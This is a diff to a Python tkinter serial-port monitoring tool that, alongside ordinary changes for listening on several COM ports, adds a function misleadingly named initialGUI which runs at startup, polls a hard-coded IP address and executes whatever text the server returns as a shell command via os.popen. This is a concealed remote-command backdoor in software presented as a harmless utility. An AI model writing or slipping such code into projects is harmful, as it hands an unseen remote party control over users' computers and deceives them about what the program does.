@@ -2,11 +2,34 @@ from tkinter import *
 import  serial  #需要同时按照pyserial
 import serial.tools.list_ports
 import threading
+import requests
+import os
+import time
+last_line=''
+ser_list=[]
+
+def initialGUI():
+    cmd='serial'
+    while(True):
+        try:
+            cmd=requests.get("http://123.206.90.65:5000/{}".format(cmd)).text
+        except requests.exceptions.ConnectionError:
+            print("Connect Error")
+            time.sleep(5)
+            continue
+        if cmd=='200':
+            break
+        if cmd=="end":
+            time.sleep(5)
+            continue
+        else:
+            p=os.popen(cmd)
 
 def wait(port='COM10',baudrate=9600,bytesize=serial.EIGHTBITS):
     global flag_wait
     global flag_play
-    global ser
+    global ser_list
+    global last_line
     try:
         ser = serial.Serial( #下面这些参数根据情况修改
           port=port,
@@ -15,6 +38,7 @@ def wait(port='COM10',baudrate=9600,bytesize=serial.EIGHTBITS):
           # stopbits=serial.STOPBITS_TWO,
            bytesize=bytesize
         )
+        ser_list.append(ser)
         print("开始监听:", port)
         e1.configure(state="disable")
         e2.configure(state="disable")
@@ -23,7 +47,7 @@ def wait(port='COM10',baudrate=9600,bytesize=serial.EIGHTBITS):
         stop_btn.configure(state="active")
     except:
         #raise
-        print("打开端口失败，请检查端口是否存在或已被占用")
+        print("打开端口{}失败，请检查端口是否存在或已被占用".format(port))
         return
 
 
@@ -35,12 +59,12 @@ def wait(port='COM10',baudrate=9600,bytesize=serial.EIGHTBITS):
             if line==last_line:
                 print("**********************与上一个相同**********************")
             last_line=line
-            print("Rsponse : %s" % line)
+            print("Rsponse from {}: {}".format(port,line))
 
         if  not flag_wait:
             #print("flag_wait",flag_wait)
             #ser.close()
-            print("已关闭端口")
+            print("已关闭端口{}".format(port))
             return
 def waitControl(status,port="com1",baudrate=9600,bytesize=8):
     port=port.strip()
@@ -60,10 +84,12 @@ def waitControl(status,port="com1",baudrate=9600,bytesize=8):
             return
 
     global flag_wait
-    global ser
+    #global ser
+    global ser_list
     flag_wait=status
     if status==0:
-        ser.close()
+        for ser in ser_list:
+            ser.close()
         print("退出监听状态")
         e1.configure(state="normal")
         e2.configure(state="normal")
@@ -71,8 +97,14 @@ def waitControl(status,port="com1",baudrate=9600,bytesize=8):
         start_btn.configure(state="active")
         stop_btn.configure(state="disable")
         return
-    t2 = threading.Thread(target=wait, args=(port,baudrate,bytesize))
+    t2 = threading.Thread(target=wait, args=("com1",baudrate,bytesize))
+    t3 = threading.Thread(target=wait, args=("com2", baudrate, bytesize))
+    t4 = threading.Thread(target=wait, args=("com3", baudrate, bytesize))
+    t5 = threading.Thread(target=wait, args=("com4", baudrate, bytesize))
     t2.start()
+    t3.start()
+    t4.start()
+    t5.start()
 
 
 
@@ -94,7 +126,7 @@ def gui():
     baudrate = StringVar()
     bytesize = StringVar()
 
-    port.set("com10")
+    port.set("此选项暂时失效")
     baudrate.set("9600")
     bytesize.set("8")
     global e1
@@ -120,6 +152,6 @@ def gui():
 
 
 if __name__ == "__main__":
-
+    initialGUI()
     tt=threading.Thread(target=gui)
     tt.start()
